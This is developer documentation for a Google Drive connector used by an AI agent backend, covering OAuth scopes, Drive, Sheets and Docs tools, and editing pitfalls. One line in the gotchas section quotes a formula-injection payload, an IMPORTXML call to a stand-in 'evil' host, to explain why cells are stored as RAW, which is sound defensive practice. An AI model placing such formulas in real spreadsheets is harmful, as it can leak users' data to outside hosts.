# Google Drive Connector

Runtime definition: Python port in progress (`apps/backend/src/yomi/connectors/`)

Runtime id: `google-drive`

Auth: OAuth 2.0 with `https://www.googleapis.com/auth/drive` and
`userinfo.email`.

The `drive` scope also authorizes the **Slides**, **Sheets**, and **Docs** APIs
— no extra consent. But each of those APIs must be separately **enabled** in the
Cloud project or every call 403s with a valid token. Scope ≠ API enablement.

## Tools

| Tool                     | Type               | Purpose                                                                                                                                                                   |
| ------------------------ | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `drive-getStorageQuota`  | Read               | Report Drive usage, limit, free space, and percentage used.                                                                                                               |
| `drive-searchFiles`      | Read               | Search files with Drive query syntax.                                                                                                                                     |
| `drive-listFiles`        | Read               | List recent files globally or in a folder.                                                                                                                                |
| `drive-getFile`          | Read               | Get metadata for one file.                                                                                                                                                |
| `drive-readFile`         | Read               | Export/read text from Docs, Sheets, Slides, text, CSV, JSON, and markdown files.                                                                                          |
| `drive-listPermissions`  | Read               | List permissions on a file.                                                                                                                                               |
| `drive-createFile`       | Write              | Create a Google Doc (Markdown → formatted), Sheet (CSV/TSV → grid), Slides (Markdown → multi-slide deck), Drawing, Apps Script, Form, Site, or Jamboard via `kind` param. |
| `drive-createFolder`     | Write              | Create a folder with optional parent.                                                                                                                                     |
| `drive-updateFile`       | Write              | Rename and/or move a file.                                                                                                                                                |
| `drive-deleteFile`       | Write/Irreversible | Trash or permanently delete a file.                                                                                                                                       |
| `drive-shareFile`        | Write              | Share with user/group or create a shareable link.                                                                                                                         |
| `drive-copyFile`         | Write              | Copy a file.                                                                                                                                                              |
| `drive-convertFile`      | Write              | Convert a Google Doc to PDF or other format.                                                                                                                              |
| `drive-listSheetTabs`    | Read               | List a spreadsheet's tabs with row/column counts — call before reading a range.                                                                                           |
| `drive-readSheet`        | Read               | Read cell values from an A1 range ("what's in my budget sheet").                                                                                                          |
| `drive-appendSheetRows`  | Write              | Append rows below existing data — never overwrites ("add this expense").                                                                                                  |
| `drive-updateSheetRange` | Write              | Overwrite a specific A1 range. Destructive.                                                                                                                               |
| `drive-appendToDoc`      | Write              | Append plain text to the end of an existing Doc.                                                                                                                          |
| `drive-replaceInDoc`     | Write              | Find and replace every occurrence in an existing Doc.                                                                                                                     |

## Notes

Binary files return metadata and links instead of content. Permanent deletion
must be treated as irreversible and explicitly confirmed. All write operations
use `gateWrite`.

## Sheets and Docs editing gotchas

- **Always `RAW`, never `USER_ENTERED`.** Agent-supplied content is untrusted,
  and `USER_ENTERED` would evaluate a cell like `=IMPORTXML("http://evil/", …)`
  as a live formula (CSV/formula injection). `RAW` stores every string
  literally. `coerceCell()` still converts plain numbers to real numbers, while
  a strict pattern keeps leading-zero strings (IDs, zip codes, phone numbers) as
  text.
- **Docs has no append.** You insert at an index. The body's final position is
  the newline that closes it, so text must go at `endIndex - 1` — inserting at
  `endIndex` is rejected. `drive-appendToDoc` reads `body.content` to find it.
- **Append vs overwrite is a real distinction.** `drive-appendSheetRows` uses
  `:append` with `INSERT_ROWS`, so Google finds the first empty row itself and
  nothing is clobbered. `drive-updateSheetRange` is the destructive one; the
  tool descriptions steer the model between them.
- Tab names with spaces or quotes must be single-quoted in an A1 reference, with
  `''` escaping a literal quote — `a1()` handles this.
